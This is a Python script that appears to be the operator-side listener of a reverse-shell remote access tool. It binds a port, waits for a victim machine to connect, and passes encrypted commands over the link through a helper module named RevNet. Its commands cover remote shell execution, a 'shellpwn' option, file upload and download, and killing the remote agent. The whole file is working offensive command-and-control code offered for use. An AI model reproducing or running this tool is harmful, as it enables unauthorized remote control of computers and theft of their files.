#!/usr/bin/python3
import socket
import sys
import time
import _thread
import RevNet
import os

def nop():

	return 0

if(len(sys.argv)!=3):

	print("Usage "+sys.argv[0]+" <ip> <port>")

	exit()

def smake():

    try:

        global host

        global port

        global s

        host=sys.argv[1]

        port=int(sys.argv[2])

        s=socket.socket()

    except socket.error as msg:
        print(str(msg))

def sbind():

    try:

        global host

        global port

        global s

        print("Binding to: "+str(port))

        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        s.bind((host,port))

        s.listen(5)
        
    except socket.error as msg:

        print(str(msg))

def saccept():

    global s

    try:

        global c,addr

        c,addr=s.accept()

        print("Connected: "+addr[0]+":"+str(addr[1]))

        passcmd()

        c.close()

    except socket.error as msg:

        print(str(msg))

def passcmd():

    global c

    global s

    cdir=RevNet.dec(str(RevNet.recv_all(c).decode("utf-8")))

    print(cdir,end="")

    while True:

        cmd=input()

        if cmd=='quit':

            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))

            time.sleep(10)

            c.close()

            s.close()

            sys.exit()

        elif cmd=="kill_quit":

            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))

            time.sleep(10)

            c.close()

            s.close()

            sys.exit()

        elif cmd[:5]=="lexec":

            os.system(cmd[6:])

            print(cdir,end="")

        elif cmd=="lpwd":

            print(os.getcwd())

            print(cdir,end="")

        elif cmd[:3]=="lcd":

            os.chdir(cmd[4:])

            print(os.getcwd())

            print(cdir,end="")

        elif cmd=="lls":

            files=os.listdir()

            for filename in files:

                print(filename)

            print(cdir,end="")

        elif cmd[:6]=="ftrans":

            RevNet.send_all(c,str.encode(RevNet.enc("ftrans")))

            RevNet.ftrans(c,cmd[7:])

            print(cdir,end="")

        elif cmd[:8]=="download":

            fname=input("File Name:")

            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))

            RevNet.send_all(c,str.encode(RevNet.enc(fname)))

            print(RevNet.recv_all(c).decode())

            print(cdir,end="")

        elif cmd[:8]=="shellpwn":

            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))

            print(RevNet.dec(RevNet.recv_all(c).decode()))

            print(cdir,end="")

        elif cmd[:4]=="fget":

            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))

            RevNet.frecv(c)

            print(cdir,end="")

        elif len(str.encode(cmd))>0:

            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))

            crecv=RevNet.dec(str(RevNet.recv_all(c).decode("utf-8")))

            i=crecv.find('>')

            n=crecv.find('`')

            cdir=crecv[n+1:i+1]

            print(crecv.replace('`',''), end="")

def main():

    smake()
    sbind()
    saccept()

main()
